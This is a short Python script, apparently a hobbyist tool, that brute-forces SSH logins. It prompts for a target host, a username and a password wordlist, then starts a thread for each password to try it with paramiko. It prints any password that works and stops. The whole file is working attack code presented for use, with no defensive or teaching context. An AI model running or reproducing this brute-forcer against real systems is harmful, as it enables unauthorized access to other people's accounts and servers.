import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored('[+] Found Password: ', 'green') + password + termcolor.colored(' , For Account ', 'green') + username)
    except paramiko.AuthenticationException:
        print(termcolor.colored('[-] Incorrect Login: ', 'red') + password)
    except socket.error as e:
        print(termcolor.colored(("[!!] Can't Connect"), 'orange'))
        sys.exit(1)

    ssh.close()
    
host = input(termcolor.colored('[+] Target Address: ', 'blue'))
username = input(termcolor.colored('[+] SSH Username: ', 'blue'))
pass_file = input(termcolor.colored('[+] Password File/Path: ', 'blue'))
print('\n')

if os.path.exists(pass_file) == False:
    print(termcolor.colored('[!!] File/Path Does Not Exist.', 'yellow'))
    sys.exit(1)

print(termcolor.colored("* * * Starting Threaded SSH Bruteforcer On: ", 'yellow') + host + termcolor.colored(", with account: ", 'yellow') + username + termcolor.colored(" * * *", 'yellow'))

with open(pass_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        
        password = line.strip()

        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)

